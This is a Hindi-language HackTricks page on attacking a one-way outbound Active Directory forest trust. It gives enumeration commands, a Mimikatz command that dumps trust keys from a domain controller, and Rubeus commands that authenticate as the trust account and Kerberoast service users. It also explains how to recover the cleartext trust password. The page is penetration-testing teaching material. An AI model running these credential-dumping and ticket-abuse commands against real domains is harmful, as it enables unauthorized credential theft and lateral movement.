# बाहरी फ़ॉरेस्ट डोमेन - एकतरफा (आउटबाउंड)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) के साथ शून्य से लेकर हीरो तक AWS हैकिंग सीखें</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) को **फॉलो करें**.
* [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें.

</details>

इस परिदृश्य में **आपका डोमेन** कुछ **विशेषाधिकारों** को **अलग डोमेन्स** से आने वाले प्रिंसिपल पर **भरोसा** कर रहा है।

## सूचीकरण

### आउटबाउंड ट्रस्ट
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## ट्रस्ट अकाउंट अटैक

जब एक एक्टिव डायरेक्टरी डोमेन या फॉरेस्ट ट्रस्ट डोमेन _B_ से डोमेन _A_ के लिए सेटअप किया जाता है (_**B**_ A पर भरोसा करता है), डोमेन **A** में एक ट्रस्ट अकाउंट बनाया जाता है, जिसका नाम **B. Kerberos trust keys** होता है,\_जो कि **ट्रस्ट अकाउंट के पासवर्ड** से निकाले जाते हैं, और इनका उपयोग **इंटर-रियल्म TGTs को एन्क्रिप्ट करने** में होता है, जब डोमेन A के यूजर्स डोमेन B में सर्विसेज के लिए सर्विस टिकट्स की अनुरोध करते हैं।

डोमेन कंट्रोलर का उपयोग करके विश्वसनीय अकाउंट का पासवर्ड और हैश प्राप्त करना संभव है:
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
जोखिम इसलिए है क्योंकि ट्रस्ट अकाउंट B$ सक्षम है, **B$ का प्राइमरी ग्रुप डोमेन A के डोमेन यूजर्स है**, डोमेन यूजर्स को दी गई कोई भी अनुमति B$ पर लागू होती है, और B$ की साख का उपयोग करके डोमेन A के खिलाफ प्रमाणित करना संभव है।

{% hint style="warning" %}
इसलिए, ट्रस्टिंग डोमेन से यह संभव है कि **ट्रस्टेड डोमेन के अंदर एक यूजर प्राप्त किया जा सके**। इस यूजर के पास बहुत अधिक अनुमतियां नहीं होंगी (शायद केवल डोमेन यूजर्स) लेकिन आप **बाहरी डोमेन का अनुक्रमण कर पाएंगे**।
{% endhint %}

इस उदाहरण में ट्रस्टिंग डोमेन `ext.local` है और ट्रस्टेड वाला `root.local` है। इसलिए, `root.local` के अंदर `EXT$` नामक एक यूजर बनाया गया है।
```bash
# Use mimikatz to dump trusted keys
lsadump::trust /patch
# You can see in the output the old and current credentials
# You will find clear text, AES and RC4 hashes
```
इसलिए, इस समय **`root.local\EXT$`** का वर्तमान **स्पष्ट पाठ पासवर्ड और केर्बेरोस गुप्त कुंजी** है। **`root.local\EXT$`** केर्बेरोस AES गुप्त कुंजियाँ AES ट्रस्ट कुंजियों से भिन्न होती हैं क्योंकि एक अलग नमक का उपयोग किया जाता है, परंतु **RC4 कुंजियाँ समान होती हैं**। इसलिए, हम **RC4 ट्रस्ट कुंजी का उपयोग कर सकते हैं** जो ext.local से निकाली गई है `root.local\EXT$` के रूप में `root.local` के खिलाफ **प्रमाणित करने** के लिए।
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
इसके साथ आप उस डोमेन का अनुक्रमण शुरू कर सकते हैं और यहां तक कि केर्बेरोस्टिंग उपयोगकर्ताओं को भी:
```
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### स्पष्ट पाठ विश्वास पासवर्ड एकत्रित करना

पिछले प्रवाह में **स्पष्ट पाठ पासवर्ड** के बजाय विश्वास हैश का उपयोग किया गया था (जिसे mimikatz द्वारा भी **डंप किया गया था**).

स्पष्ट पाठ पासवर्ड को mimikatz से \[ CLEAR ] आउटपुट को हेक्साडेसिमल से परिवर्तित करके और नल बाइट्स ‘\x00’ को हटाकर प्राप्त किया जा सकता है:

![](<../../.gitbook/assets/image (2) (1) (2) (1).png>)

कभी-कभी विश्वास संबंध बनाते समय, उपयोगकर्ता द्वारा विश्वास के लिए एक पासवर्ड टाइप किया जाना चाहिए। इस प्रदर्शन में, कुंजी मूल विश्वास पासवर्ड है और इसलिए मानव पठनीय है। जैसे कुंजी चक्र (30 दिन) होते हैं, स्पष्ट पाठ मानव पठनीय नहीं होगा लेकिन तकनीकी रूप से अभी भी उपयोगी होगा।

स्पष्ट पाठ पासवर्ड का उपयोग विश्वास खाते के रूप में नियमित प्रमाणीकरण करने के लिए किया जा सकता है, विश्वास खाते की Kerberos गुप्त कुंजी का उपयोग करके TGT का अनुरोध करने का एक विकल्प। यहाँ, root.local से ext.local के लिए Domain Admins के सदस्यों की पूछताछ करना:

![](<../../.gitbook/assets/image (1) (1) (1) (2).png>)

## संदर्भ

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर मुझे 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)** का अनुसरण करें**.
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>
